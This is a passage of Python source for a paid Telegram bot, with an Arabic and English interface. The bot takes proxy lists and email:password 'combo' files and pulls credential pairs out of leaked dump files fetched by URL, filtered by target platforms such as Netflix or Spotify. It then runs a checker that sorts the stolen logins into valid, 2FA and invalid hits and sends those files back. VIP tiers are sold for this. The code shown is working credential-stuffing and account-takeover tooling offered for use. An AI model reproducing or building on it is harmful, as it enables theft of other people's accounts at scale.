    rem_text = t['remaining_tries'].format(free=user['free_uses']) if not user["is_vip"] else t['unlimited_vip']
    final_text = (
        f"{EMOJI['yes']} <b>Checking Complete!</b>\n\n"
        f"{EMOJI['card']} <b>Total Checked:</b> {stats['checked']}\n"
        f"{EMOJI['yes']} <b>Valid:</b> {stats['valid']}\n"
        f"{EMOJI['warning']} <b>2FA:</b> {stats['2fa']}\n"
        f"{EMOJI['no']} <b>Invalid:</b> {stats['invalid']}\n"
        f"⏱ <b>Time:</b> {elapsed:.2f}s\n"
        f"{rem_text}"
    )

    try:
        await bot_ref.delete_message(chat_id, status_msg.message_id)
    except Exception:
        pass

    await bot_ref.send_message(chat_id, final_text, parse_mode='HTML')

    if os.path.exists(hits_path):
        with open(hits_path, 'rb') as f:
            await bot_ref.send_document(chat_id, f, caption=f"{EMOJI['fire']} Hits ({stats['valid']})", parse_mode='HTML')
    if os.path.exists(twofa_path):
        with open(twofa_path, 'rb') as f:
            await bot_ref.send_document(chat_id, f, caption=f"{EMOJI['warning']} 2FA ({stats['2fa']})", parse_mode='HTML')

# ============================================================
# MENU MARKUP (Updated with Phase 2 features)
# ============================================================
def get_main_menu_markup(user, chat_id):
    markup = InlineKeyboardMarkup()
    lang = user["lang"] or "ar"
    t = LANGS[lang]

    if user["is_vip"]:
        time_left = get_remaining_time_str(user["vip_expiry"], lang)
        vip_text = f"{t['vip_active']} {time_left} 💎"
        markup.add(InlineKeyboardButton(vip_text, callback_data="vip_status_info"))
    else:
        markup.add(InlineKeyboardButton(t['vip_buy'], callback_data="buy_vip"))

    markup.add(InlineKeyboardButton(t['lang_btn'], callback_data="toggle_language"))
    markup.add(InlineKeyboardButton(t['upload_proxies_btn'], callback_data="upload_proxies"))
    markup.add(InlineKeyboardButton(t['upload_combos_btn'], callback_data="upload_combos"))

    if os.path.exists(user_file(chat_id, "combos.txt")):
        markup.add(InlineKeyboardButton(t['start_checking_btn'], callback_data="start_checking"))

    if int(chat_id) == int(ADMIN_ID):
        markup.add(InlineKeyboardButton(t['admin_panel_btn'], callback_data="admin_panel"))

    return markup

# ============================================================
# ORIGINAL + NEW HANDLERS
# ============================================================

@bot.message_handler(commands=['start'])
async def start_cmd(message: Message):
    chat_id = message.chat.id
    user = get_user(chat_id, message.from_user.username)

    if user["banned"]:
        await bot.reply_to(message, f"{EMOJI['no']} عذراً، لقد تم حظرك من استخدام البوت.")
        return

    is_subscribed = await check_subscription(chat_id)
    if not is_subscribed:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("📢 اشترك في القناة الآن", url=CHANNEL_URL))
        markup.add(InlineKeyboardButton("تحقق من الاشتراك", callback_data="check_sub"))
        await bot.reply_to(message, f"{EMOJI['warning']} يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه!\n\n📌 القناة: {CHANNEL_URL}", reply_markup=markup, parse_mode='HTML')
        return

    if not user["lang"]:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🇸🇦 العربية", callback_data="set_lang_ar"), InlineKeyboardButton("🇬🇧 English", callback_data="set_lang_en"))
        await bot.reply_to(message, f"{EMOJI['lightning']} Please choose your language / اختر لغتك:", reply_markup=markup, parse_mode='HTML')
        return

    user_states.pop(chat_id, None)
    lang = user["lang"]
    text = LANGS[lang]['welcome']
    markup = get_main_menu_markup(user, chat_id)
    await bot.reply_to(message, text, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data in ["set_lang_ar", "set_lang_en"])
async def set_initial_language(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    lang = "ar" if call.data == "set_lang_ar" else "en"
    update_user_field(chat_id, "lang", lang)
    user = get_user(chat_id)
    t = LANGS[lang]
    markup = get_main_menu_markup(user, chat_id)
    await bot.edit_message_text(t['welcome'], chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "check_sub")
async def verify_subscription(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    user = get_user(chat_id)
    if not await check_subscription(chat_id):
        await bot.answer_callback_query(call.id, "❌ لم تقم بالاشتراك بعد!", show_alert=True)
        return

    if not user["lang"]:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🇸🇦 العربية", callback_data="set_lang_ar"), InlineKeyboardButton("🇬🇧 English", callback_data="set_lang_en"))
        await bot.edit_message_text(f"{EMOJI['lightning']} Please choose your language / اختر لغتك:", chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')
        return

    t = LANGS[user["lang"]]
    markup = get_main_menu_markup(user, chat_id)
    await bot.edit_message_text(t['welcome'], chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "toggle_language")
async def toggle_language_handler(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    user = get_user(chat_id)
    new_lang = "en" if user["lang"] == "ar" else "ar"
    update_user_field(chat_id, "lang", new_lang)
    user = get_user(chat_id)
    t = LANGS[user["lang"]]
    markup = get_main_menu_markup(user, chat_id)
    await bot.edit_message_text(t['welcome'], chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "vip_status_info")
async def vip_status_info_handler(call):
    chat_id = call.message.chat.id
    user = get_user(chat_id)
    lang = user["lang"] or "ar"
    time_left = get_remaining_time_str(user["vip_expiry"], lang)
    msg = f"⭐ اشتراكك نشط.\n⏳ الوقت المتبقي: {time_left} 💎" if lang=='ar' else f"⭐ VIP is active.\n⏳ Time left: {time_left} 💎"
    await bot.answer_callback_query(call.id, msg, show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "buy_vip")
async def buy_vip_menu(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    user = get_user(chat_id)
    lang = user["lang"] or "ar"

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("يوم تجريبي (Test) - 2$", url=f"https://t.me/{ADMIN_USERNAME}"))
    markup.add(InlineKeyboardButton("أسبوعي - 15$", url=f"https://t.me/{ADMIN_USERNAME}"))
    markup.add(InlineKeyboardButton("شهري - 30$", url=f"https://t.me/{ADMIN_USERNAME}"))
    markup.add(InlineKeyboardButton("لايف تايم (Lifetime) - 150$", url=f"https://t.me/{ADMIN_USERNAME}"))
    markup.add(InlineKeyboardButton("رجوع", callback_data="back_to_home"))

    text = f"{EMOJI['diamond']} <b>اختر باقة الاشتراك المطلوبة وتواصل مباشرة مع الأدمن لشحن الحساب:</b>" if lang=='ar' else f"{EMOJI['diamond']} <b>Choose your VIP package and contact admin to upgrade:</b>"
    await bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "back_to_home")
async def back_to_home_handler(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    active_downloads[chat_id] = False
    user = get_user(chat_id)
    user_states.pop(chat_id, None)
    t = LANGS[user["lang"] or "ar"]
    markup = get_main_menu_markup(user, chat_id)
    await bot.edit_message_text(t['welcome'], chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "cancel_download")
async def cancel_download_handler(call):
    chat_id = call.message.chat.id
    user = get_user(chat_id)
    t = LANGS[user["lang"] or "ar"]
    active_downloads[chat_id] = False
    user_states.pop(chat_id, None)
    await bot.answer_callback_query(call.id, t['process_cancelled'])
    try:
        markup = get_main_menu_markup(user, chat_id)
        await bot.edit_message_text(t['process_cancelled'], chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')
    except Exception:
        pass

# ============================================================
# NEW PHASE 2 HANDLERS
# ============================================================
@bot.callback_query_handler(func=lambda call: call.data == "upload_proxies")
async def upload_proxies_handler(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    user = get_user(chat_id)
    user_states[chat_id] = {"step": "awaiting_proxy_upload"}
    t = LANGS[user["lang"] or "ar"]
    markup = InlineKeyboardMarkup().add(InlineKeyboardButton(t['cancel_btn'], callback_data="back_to_home"))
    await bot.edit_message_text(t['send_proxy_file'], chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "upload_combos")
async def upload_combos_handler(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    user = get_user(chat_id)
    user_states[chat_id] = {"step": "awaiting_combo_upload"}
    t = LANGS[user["lang"] or "ar"]
    markup = InlineKeyboardMarkup().add(InlineKeyboardButton(t['cancel_btn'], callback_data="back_to_home"))
    await bot.edit_message_text(t['send_combo_file'], chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "start_checking")
async def start_checking_handler(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    await run_combo_checker(chat_id, bot, call.message.message_id)

@bot.callback_query_handler(func=lambda call: call.data == "cancel_checking")
async def cancel_checking_handler(call):
    chat_id = call.message.chat.id
    active_downloads[chat_id] = False
    await bot.answer_callback_query(call.id, "Stopping...")

# ============================================================
# DOCUMENT UPLOAD HANDLER (Proxies + Combos)
# ============================================================
@bot.message_handler(content_types=['document'])
async def handle_document(message: Message):
    chat_id = message.chat.id
    user = get_user(chat_id, message.from_user.username)

    if user["banned"]:
        return

    if not await check_subscription(chat_id):
        t = LANGS[user["lang"] or "ar"]
        await bot.reply_to(message, f"{t['sub_required']} {CHANNEL_URL}", parse_mode='HTML')
        return

    if not message.document.file_name.endswith('.txt'):
        await bot.reply_to(message, "Please send a .txt file only.", parse_mode='HTML')
        return

    if message.document.file_size and message.document.file_size > 10 * 1024 * 1024:
        t = LANGS[user["lang"] or "ar"]
        await bot.reply_to(message, t['file_too_large'], parse_mode='HTML')
        return

    state = user_states.get(chat_id, {})
    step = state.get("step", "")
    t = LANGS[user["lang"] or "ar"]

    file_info = await bot.get_file(message.document.file_id)
    downloaded = await bot.download_file(file_info.file_path)
    content = downloaded.decode('utf-8', errors='ignore')
    lines = [l.strip() for l in content.splitlines() if l.strip()]

    if step == "awaiting_proxy_upload":
        await bot.reply_to(message, t['proxy_validation'].format(count=len(lines)), parse_mode='HTML')
        valid_proxies = await validate_proxies(lines)

        proxy_file = user_file(chat_id, "proxies.txt")
        existing = set()
        if os.path.exists(proxy_file):
            with open(proxy_file, 'r', encoding='utf-8') as f:
                existing = set(l.strip() for l in f if l.strip())
        existing.update(valid_proxies)
        with open(proxy_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(existing))

        user_states.pop(chat_id, None)
        markup = get_main_menu_markup(user, chat_id)
        await bot.send_message(chat_id, t['proxies_saved'].format(count=len(valid_proxies)), reply_markup=markup, parse_mode='HTML')

    elif step == "awaiting_combo_upload":
        valid_combos = [l for l in lines if is_valid_combo(l)]
        combo_file = user_file(chat_id, "combos.txt")
        existing = set()
        if os.path.exists(combo_file):
            with open(combo_file, 'r', encoding='utf-8') as f:
                existing = set(l.strip() for l in f if l.strip())
        existing.update(valid_combos)
        with open(combo_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(existing))

        user_states.pop(chat_id, None)
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(t['start_checking_btn'], callback_data="start_checking"))
        markup.add(InlineKeyboardButton(t['upload_combos_btn'], callback_data="upload_combos"))
        markup.add(InlineKeyboardButton(t['cancel_btn'], callback_data="back_to_home"))
        await bot.send_message(chat_id, t['combos_loaded'].format(count=len(valid_combos)), reply_markup=markup, parse_mode='HTML')

    else:
        proxy_like = sum(1 for l in lines if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+', l))
        combo_like = sum(1 for l in lines if ':' in l and '@' in l)

        if proxy_like > combo_like and proxy_like > 0:
            await bot.reply_to(message, t['auto_detect_proxy'], parse_mode='HTML')
            valid_proxies = await validate_proxies(lines)
            proxy_file = user_file(chat_id, "proxies.txt")
            existing = set()
            if os.path.exists(proxy_file):
                with open(proxy_file, 'r', encoding='utf-8') as f:
                    existing = set(l.strip() for l in f if l.strip())
            existing.update(valid_proxies)
            with open(proxy_file, 'w', encoding='utf-8') as f:
                f.write('\n'.join(existing))
            markup = get_main_menu_markup(user, chat_id)
            await bot.send_message(chat_id, t['proxies_saved'].format(count=len(valid_proxies)), reply_markup=markup, parse_mode='HTML')
        elif combo_like > 0:
            valid_combos = [l for l in lines if is_valid_combo(l)]
            combo_file = user_file(chat_id, "combos.txt")
            existing = set()
            if os.path.exists(combo_file):
                with open(combo_file, 'r', encoding='utf-8') as f:
                    existing = set(l.strip() for l in f if l.strip())
            existing.update(valid_combos)
            with open(combo_file, 'w', encoding='utf-8') as f:
                f.write('\n'.join(existing))
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton(t['start_checking_btn'], callback_data="start_checking"))
            markup.add(InlineKeyboardButton(t['upload_combos_btn'], callback_data="upload_combos"))
            markup.add(InlineKeyboardButton(t['cancel_btn'], callback_data="back_to_home"))
            await bot.send_message(chat_id, t['combos_loaded'].format(count=len(valid_combos)), reply_markup=markup, parse_mode='HTML')
        else:
            await bot.reply_to(message, "Could not detect file type. Please use the menu buttons to upload.", parse_mode='HTML')

# ============================================================
# ADMIN PANEL (Original)
# ============================================================
@bot.callback_query_handler(func=lambda call: call.data == "admin_panel")
async def admin_panel(call):
    await bot.answer_callback_query(call.id)
    if int(call.message.chat.id) != int(ADMIN_ID): return
    admin_states.pop(ADMIN_ID, None)
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("ترقية VIP", callback_data="adm_add_vip"))
    markup.add(InlineKeyboardButton("حظر مستخدم", callback_data="adm_ban"))
    markup.add(InlineKeyboardButton("إذاعة", callback_data="adm_broadcast"))
    markup.add(InlineKeyboardButton("إحصائيات", callback_data="adm_stats"))
    markup.add(InlineKeyboardButton("رجوع", callback_data="back_to_home"))
    await bot.edit_message_text(f"{EMOJI['admin']} <b>لوحة تحكم الأدمن:</b>", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data.startswith("adm_"))
async def admin_actions_handler(call):
    await bot.answer_callback_query(call.id)
    if int(call.message.chat.id) != int(ADMIN_ID): return
    action = call.data
    markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))

    if action == "adm_add_vip":
        admin_states[ADMIN_ID] = {"step": "waiting_vip_user"}
        await bot.edit_message_text(f"{EMOJI['card']} <b>أرسل (أيدي المستخدم) أو (يوزرنيم المستخدم) لتفعليه:</b>", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='HTML')
    elif action == "adm_ban":
        admin_states[ADMIN_ID] = {"step": "waiting_ban_user"}
        await bot.edit_message_text(f"{EMOJI['no']} <b>أرسل أيدي أو يوزرنيم المستخدم المراد حظره:</b>", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='HTML')
    elif action == "adm_broadcast":
        admin_states[ADMIN_ID] = {"step": "waiting_broadcast_msg"}
        await bot.edit_message_text(f"{EMOJI['rocket']} <b>أرسل الرسالة المراد إذاعتها لجميع مستخدمي البوت:</b>", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='HTML')
    elif action == "adm_stats":
        conn = sqlite3.connect("database.db")
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM users")
        total_users = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM users WHERE is_vip = 1")
        total_vips = cursor.fetchone()[0]
        conn.close()
        stats_text = f"{EMOJI['circle']} <b>إحصائيات البوت:</b>\n\n👥 <b>إجمالي المستخدمين:</b> `{total_users}`\n{EMOJI['diamond']} <b>إجمالي مشتركين VIP:</b> `{total_vips}`"
        await bot.edit_message_text(stats_text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)

# ============================================================
# TEXT MESSAGE HANDLER (Original + Admin Flow)
# ============================================================
@bot.message_handler(content_types=['text'])
async def handle_text_messages(message: Message):
    chat_id = message.chat.id
    text = message.text.strip()
    user = get_user(chat_id, message.from_user.username)
    lang = user["lang"] or "ar"
    t = LANGS[lang]

    if int(chat_id) == int(ADMIN_ID) and ADMIN_ID in admin_states:
        state = admin_states[ADMIN_ID]
        if state["step"] == "waiting_vip_user":
            target_id = get_user_by_id_or_username(text)
            if not target_id:
                await bot.reply_to(message, f"{EMOJI['no']} لم يتم العثور على المستخدم.")
                return
            state["target_id"] = target_id
            state["step"] = "waiting_vip_duration"
            await bot.reply_to(message, f"{EMOJI['card']} أرسل مدة الاشتراك بالأيام (مثال: 1 أو 30) أو اكتب life للـ مدى الحياة:")
            return
        elif state["step"] == "waiting_vip_duration":
            target_id = state["target_id"]
            if text.lower() in ["life", "lifetime"]:
                expiry_str = None
                duration_text = "مدى الحياة (Lifetime)"
            else:
                days_num = int(text)
                expiry_str = (datetime.now() + timedelta(days=days_num)).isoformat()
                duration_text = f"{days_num} يوم/أيام"

            update_user_field(target_id, "is_vip", 1)
            update_user_field(target_id, "vip_expiry", expiry_str)
            admin_states.pop(ADMIN_ID, None)

            await bot.reply_to(message, f"{EMOJI['yes']} تم تفعيل VIP بنجاح للمستخدم `{target_id}` لمدة: {duration_text}")
            try:
                await bot.send_message(
                    target_id, 
                    f"{EMOJI['rocket']} <b>مبروك! تم ترقية حسابك إلى VIP بنجاح.</b>\n⏳ <b>مدة الاشتراك المضافة:</b> `{duration_text}`\n{EMOJI['diamond']} <b>استمتع بالاستخدام غير المحدود!</b>",
                    parse_mode='HTML'
                )
            except Exception as e:
                print(f"Could not notify user: {e}")
            return

        elif state["step"] == "waiting_ban_user":
            target_id = get_user_by_id_or_username(text)
            if target_id: update_user_field(target_id, "banned", 1)
            admin_states.pop(ADMIN_ID, None)
            await bot.reply_to(message, f"{EMOJI['no']} تم حظر المستخدم بنجاح.")
            return
        elif state["step"] == "waiting_broadcast_msg":
            admin_states.pop(ADMIN_ID, None)
            conn = sqlite3.connect("database.db")
            cursor = conn.cursor()
            cursor.execute("SELECT chat_id FROM users")
            users_list = cursor.fetchall()
            conn.close()
            success_count = 0
            for (uid,) in users_list:
                try: 
                    await bot.send_message(uid, text, parse_mode='HTML')
                    success_count += 1
                except Exception: pass
            await bot.reply_to(message, f"{EMOJI['yes']} تمت الإذاعة بنجاح إلى {success_count} مستخدم.")
            return

    if user["banned"]: return

    if not user["lang"]:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🇸🇦 العربية", callback_data="set_lang_ar"), InlineKeyboardButton("🇬🇧 English", callback_data="set_lang_en"))
        await bot.reply_to(message, f"{EMOJI['lightning']} Please choose your language / اختر لغتك:", reply_markup=markup, parse_mode='HTML')
        return

    if chat_id in user_states and user_states[chat_id].get("step") == "wait_password":
        user_states[chat_id]["password"] = text
        user_states[chat_id]["step"] = "processing_url"
        await start_url_processing(chat_id, user_states[chat_id]["msg_id"])
        return

    if chat_id in user_states and user_states[chat_id].get("step") == "wait_combo_platform":
        user_states[chat_id]["platform"] = text.lower()
        msg_id = user_states[chat_id]["msg_id"]
        await start_url_processing(chat_id, msg_id)
        return

    if text.startswith("http://") or text.startswith("https://"):
        if not await check_subscription(chat_id):
            sub_err = f"{t['sub_required']} {CHANNEL_URL}"
            await bot.reply_to(message, sub_err, parse_mode='HTML')
            return

        if not user["is_vip"] and user["free_uses"] <= 0:
            markup = InlineKeyboardMarkup().add(InlineKeyboardButton(t['upgrade_vip'], callback_data="buy_vip"))
            await bot.reply_to(message, t['free_exhausted'], reply_markup=markup, parse_mode='HTML')
            return

        wait_msg = await bot.reply_to(message, f"{EMOJI['circle']} <b>جاري فحص الرابط وجلب تفاصيل الملف...</b>" if lang=='ar' else f"{EMOJI['circle']} <b>Inspecting link...</b>", parse_mode='HTML')

        try:
            timeout = aiohttp.ClientTimeout(total=20)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.head(text, allow_redirects=True) as resp:
                    if resp.status != 200:
                        async with session.get(text, allow_redirects=True) as resp2:
                            if resp2.status != 200:
                                await bot.edit_message_text(t['invalid_link'], chat_id, wait_msg.message_id, parse_mode='HTML')
                                return
                            resp = resp2

                    content_length = int(resp.headers.get('content-length', 0))

                    filename = "unknown_file.txt"
                    disposition = resp.headers.get('content-disposition', '')
                    if 'filename=' in disposition:
                        fname_match = re.search(r'filename\*?=([\'"]?)(?:UTF-8\'\')?([^\'",\s]+)\1', disposition)
                        if fname_match:
                            filename = fname_match.group(2)
                    else:
                        filename = text.split('/')[-1].split('?')[0] or "dump_file.txt"

                    if content_length > 1024 * 1024 * 1024:
                        size_str = f"{content_length / (1024**3):.2f} GiB"
                    elif content_length > 0:
                        size_str = f"{content_length / (1024**2):.2f} MiB"
                    else:
                        size_str = "غير معروف (Unknown Size)"

        except Exception as e:
            await bot.edit_message_text(f"{t['invalid_link']} ({e})", chat_id, wait_msg.message_id, parse_mode='HTML')
            return

        user_states[chat_id] = {
            "file_url": text,
            "filename": filename,
            "filesize_bytes": content_length,
            "filesize_str": size_str,
            "step": "selecting_option",
            "msg_id": wait_msg.message_id,
            "task": "combo"
        }

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(t['combo_btn'], callback_data="type_combo"))
        markup.add(InlineKeyboardButton(t['cancel_btn'], callback_data="back_to_home"))

        info_text = t['link_info_title'].format(filename=filename, filesize=size_str)
        await bot.edit_message_text(info_text, chat_id, wait_msg.message_id, parse_mode='HTML', reply_markup=markup)
        return

    default_msg = f"{EMOJI['diamond']} <b>أرسل رابط ملف مباشر يبدأ بـ http:// أو https:// للبدء.</b>" if lang=='ar' else f"{EMOJI['diamond']} <b>Send a direct file link.</b>"
    await bot.reply_to(message, default_msg, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "type_combo")
async def select_extraction_type(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    user = get_user(chat_id)
    lang = user["lang"] or "ar"
    t = LANGS[lang]

    if chat_id not in user_states: return

    user_states[chat_id]["task"] = "combo"
    user_states[chat_id]["step"] = "wait_combo_platform"
    markup = InlineKeyboardMarkup().add(InlineKeyboardButton(t['cancel_btn'], callback_data="back_to_home"))
    await bot.edit_message_text(f"{EMOJI['fire']} <b>أرسل اسم المنصة أو الدومين المطلوب للكومبو ULP (مثال: `hotmail`, `netflix`, `spotify` أو `all` لكل شيء):</b>", chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

async def check_password_and_start(chat_id, msg_id):
    state = user_states.get(chat_id, {})
    filename = state.get("filename", "").lower()

    if filename.endswith(('.zip', '.rar', '.7z')):
        user_states[chat_id]["step"] = "wait_password"
        user_states[chat_id]["msg_id"] = msg_id
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("❌ إلغاء", callback_data="back_to_home"))
        await bot.edit_message_text(LANGS[get_user(chat_id)["lang"] or "ar"]['password_prompt'], chat_id, msg_id, parse_mode='HTML', reply_markup=markup)
        return

    await start_url_processing(chat_id, msg_id)

# ============================================================
# URL PROCESSING (Original + Auto-save to user combos)
# ============================================================
async def start_url_processing(chat_id, msg_id):
    user = get_user(chat_id)
    lang = user["lang"] or "ar"
    t = LANGS[lang]
    state = user_states.get(chat_id, {})
    file_url = state.get("file_url")
    target_info = (state.get("platform") or "all").lower()
    filename = state.get("filename")
    total_size = state.get("filesize_bytes", 0)

    if not user["is_vip"]:
        update_user_field(chat_id, "free_uses", user["free_uses"] - 1)
        user = get_user(chat_id)

    active_downloads[chat_id] = True

    progress_markup = InlineKeyboardMarkup()
    progress_markup.add(InlineKeyboardButton(t['cancel_process'], callback_data="cancel_download"))

    try:
        status_msg = await bot.edit_message_text(t['processing_panel'], chat_id, msg_id, parse_mode='HTML', reply_markup=progress_markup)
    except Exception:
        status_msg = await bot.send_message(chat_id, t['processing_panel'], parse_mode='HTML', reply_markup=progress_markup)

    start_time = time.time()
    unique_results = set()

    try:
        timeout = aiohttp.ClientTimeout(total=900)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(file_url) as response:
                if response.status != 200:
                    active_downloads[chat_id] = False
                    await bot.edit_message_text(f"{t['error_download']}{response.status}", chat_id, status_msg.message_id, parse_mode='HTML')
                    return

                hd_len = int(response.headers.get('content-length', 0))
                if hd_len > 0:
                    total_size = hd_len

                downloaded_size = 0
                line_buffer = ""
                chunk_count = 0
                last_edit_time = 0

                async for chunk in response.content.iter_any():
                    if not active_downloads.get(chat_id, True):
                        return

                    chunk_count += 1
                    downloaded_size += len(chunk)

                    if total_size > 0:
                        percent = min(100.0, (downloaded_size / total_size) * 100)
                    else:
                        percent = min(99.0, chunk_count * 1.5)

                    current_time = time.time()
                    if current_time - last_edit_time > 2.0:
                        last_edit_time = current_time
                        bar_str = make_progress_bar(percent)
                        dl_mb = downloaded_size / (1024 * 1024)
                        tot_mb = total_size / (1024 * 1024) if total_size > 0 else 0

                        dashboard_text = (
                            f"{t['download_started_2']}"
                            f"{EMOJI['box']} <b>الملف:</b> `{filename}`\n"
                            f"{EMOJI['lightning']} <b>التقدم:</b> `{bar_str}`\n"
                            f"{EMOJI['card']} <b>المحمل:</b> `{dl_mb:.2f} MB` / `{tot_mb:.2f} MB`\n"
                            f"{EMOJI['target']} <b>استخراج الكومبو لـ:</b> `{target_info}`..."
                        )
                        try:
                            await bot.edit_message_text(dashboard_text, chat_id, status_msg.message_id, parse_mode='HTML', reply_markup=progress_markup)
                        except Exception:
                            pass

                    decoded_chunk = chunk.decode('utf-8', errors='ignore')
                    line_buffer += decoded_chunk
                    lines = line_buffer.split('\n')
                    line_buffer = lines.pop()

                    for line in lines:
                        clean_line = line.strip()
                        if not clean_line:
                            continue

                        line_lower = clean_line.lower()
                        if "@" in clean_line and ":" in clean_line:
                            parts = clean_line.split(":")
                            for i in range(len(parts) - 1):
                                if "@" in parts[i]:
                                    try:
                                        raw_email_part = parts[i].split()[-1]
                                        email_match = re.search(r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)', raw_email_part)
                                        if email_match:
                                            clean_email = email_match.group(1)
                                            if i + 1 < len(parts):
                                                raw_pass = parts[i+1].strip()
                                                clean_pass = raw_pass.split()[0].rstrip('.,;!?"\')')
                                                if len(clean_pass) > 0 and clean_pass.lower() not in ['com', 'org', 'net', 'ru']:
                                                    final_combo = f"{clean_email}:{clean_pass}"
                                                    if target_info == "all" or target_info in line_lower or target_info in clean_email.lower():
                                                        unique_results.add(final_combo)
                                    except Exception:
                                        continue

                if line_buffer.strip():
                    final_line = line_buffer.strip()
                    if "@" in final_line and ":" in final_line:
                        parts = final_line.split(":")
                        for i in range(len(parts) - 1):
                            if "@" in parts[i]:
                                try:
                                    raw_email_part = parts[i].split()[-1]
                                    email_match = re.search(r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)', raw_email_part)
                                    if email_match:
                                        clean_email = email_match.group(1)
                                        if i + 1 < len(parts):
                                            raw_pass = parts[i+1].strip()
                                            clean_pass = raw_pass.split()[0].rstrip('.,;!?"\')')
                                            if len(clean_pass) > 0 and clean_pass.lower() not in ['com', 'org', 'net', 'ru']:
                                                final_combo = f"{clean_email}:{clean_pass}"
                                                if target_info == "all" or target_info in final_line.lower() or target_info in clean_email.lower():
                                                    unique_results.add(final_combo)
                                except Exception:
                                    continue

        if not active_downloads.get(chat_id, True):
            return

        try: 
            await bot.delete_message(chat_id, status_msg.message_id)
        except Exception: 
            pass

        elapsed = time.time() - start_time
        user_states.pop(chat_id, None)
        active_downloads[chat_id] = False

        matched_list = list(unique_results)

        if not matched_list:
            await bot.send_message(chat_id, t['no_results'], parse_mode='HTML')
            return

        # Save extracted combos to user's persistent combo file for checking
        combo_file = user_file(chat_id, "combos.txt")
        existing = set()
        if os.path.exists(combo_file):
            with open(combo_file, 'r', encoding='utf-8') as f:
                existing = set(l.strip() for l in f if l.strip())
        existing.update(matched_list)
        with open(combo_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(existing))

        rem_text = t['remaining_tries'].format(free=user['free_uses']) if not user["is_vip"] else t['unlimited_vip']
        success_msg = t['success_results'].format(count=len(matched_list), elapsed=elapsed, remaining=rem_text)

        combo_filename = f"Clean_ULP_Combo_{target_info}_{int(time.time())}.txt"
        with open(combo_filename, "w", encoding="utf-8") as f:
            f.write("\n".join(matched_list))

        await bot.send_message(chat_id, success_msg, parse_mode='HTML')
        with open(combo_filename, "rb") as cf:
            await bot.send_document(chat_id, cf, caption=f"{EMOJI['fire']} <b>Pure ULP Combo Results for</b> `{target_info}`\n{EMOJI['box']} <b>Total unique items:</b> {len(matched_list)}", parse_mode='HTML')

        # Offer start checking button
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(t['start_checking_btn'], callback_data="start_checking"))
        markup.add(InlineKeyboardButton(t['cancel_btn'], callback_data="back_to_home"))
        await bot.send_message(chat_id, f"{EMOJI['diamond']} <b>Combos saved! You can now start checking or return to menu.</b>", reply_markup=markup, parse_mode='HTML')

        try:
            os.remove(combo_filename)
        except Exception:
            pass

    except Exception as e:
        active_downloads[chat_id] = False
        user_states.pop(chat_id, None)
        try:
            await bot.edit_message_text(f"{t['error_processing']}{e}", chat_id, status_msg.message_id, parse_mode='HTML')
        except Exception:
            pass

# ============================================================
# MAIN ENTRY POINT
# ============================================================
if __name__ == '__main__':
    print(f"[*] Bot is starting...")
    # Start Flask health server in background thread
    flask_thread = threading.Thread(target=run_flask_server, daemon=True)
    flask_thread.start()
    print(f"[*] Flask health server running on http://0.0.0.0:8080/health")

    while True:
        try:
